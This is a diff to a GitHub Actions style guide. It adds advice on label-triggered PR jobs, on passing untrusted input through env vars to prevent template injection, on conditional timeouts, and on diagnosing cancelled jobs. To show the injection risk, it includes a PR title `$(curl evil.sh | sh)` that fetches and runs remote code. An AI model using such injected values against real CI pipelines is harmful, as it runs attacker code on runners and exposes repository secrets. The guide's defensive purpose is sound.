@@ -45,6 +45,23 @@ on:
   workflow_dispatch:
 ```
 
+A job gated on a PR label needs `labeled` and `unlabeled` in its trigger types,
+alongside the defaults it would otherwise lose:
+
+```yaml
+on:
+  pull_request:
+    types: [opened, synchronize, reopened, labeled, unlabeled]
+```
+
+Adding the label and hitting "re-run" does not work, and is the natural thing to
+try: a re-run replays the original event, keeping "the same `GITHUB_SHA` (commit
+SHA) and `GITHUB_REF` (git ref) of the original event that triggered the workflow
+run", so it never sees the label that was just added. The label has to produce a
+new run, which is what these types are for. Note that naming `types:` at all
+replaces the default set (`opened`, `synchronize`, `reopened`), so list those
+too or the job stops running on ordinary pushes to the PR.
+
 ## Concurrency
 
 Don't add a `cancel-in-progress` concurrency group to CI by default:
@@ -108,6 +125,20 @@ uvx zizmor .github/
 Wire it into pre-commit (see the pre-commit style guide). In CI, the
 `zizmorcore/zizmor-action` reports findings to the repo's Security tab.
 
+The template-injection fix is to pass anything someone else wrote (a label, a
+title, a branch name) into `run:` through `env:` rather than `${{ }}`, and read
+the environment variable inside the script:
+
+```yaml
+- env:
+    LABELS: ${{ toJSON(github.event.pull_request.labels.*.name) }}
+  run: echo "$LABELS" | grep -q slow && echo slow=true >> "$GITHUB_OUTPUT"
+```
+
+`${{ }}` substitutes into the script *before* the shell parses it, so a PR
+titled `$(curl evil.sh | sh)` executes. An env var is data the shell never
+re-parses.
+
 zizmor's `unpinned-uses` audit defaults to demanding SHA pins, so it flags
 patch-version tags. Keep the tags (see below) and relax the policy in
 `zizmor.yml`:
@@ -159,6 +190,27 @@ Set `timeout-minutes` on every job, matrix or not. Runners default to a
 360-minute cap, so a hung step (a wedged process, a stalled network call)
 burns six hours before GitHub kills it. `timeout-minutes: 15` is a sane
 default for a quick check job; raise it only for genuinely long builds.
+
+Job-level fields are evaluated before any step runs, so `timeout-minutes` can
+only read the triggering event, never a variable a step exports. A timeout that
+varies has to compute the condition from the event directly, duplicating
+whatever a later step derives:
+
+```yaml
+timeout-minutes: ${{ contains(toJSON(github.event.pull_request.labels.*.name), 'slow') && 45 || 15 }}
+```
+
+When reading a failed run, a `cancelled` conclusion is not proof of a fail-fast
+cascade. Pull the job's timing and compare it to its own cap before concluding
+anything, since a job killed by `timeout-minutes` also reports as cancelled:
+
+```bash
+gh api repos/{owner}/{repo}/actions/runs/<id>/jobs \
+  --jq '.jobs[] | {name, conclusion, started_at, completed_at}'
+```
+
+A duration sitting exactly on the cap means it hung and was killed, which is a
+real failure to chase, not collateral damage from a sibling leg.
 
 ## Quality-Check Job
 
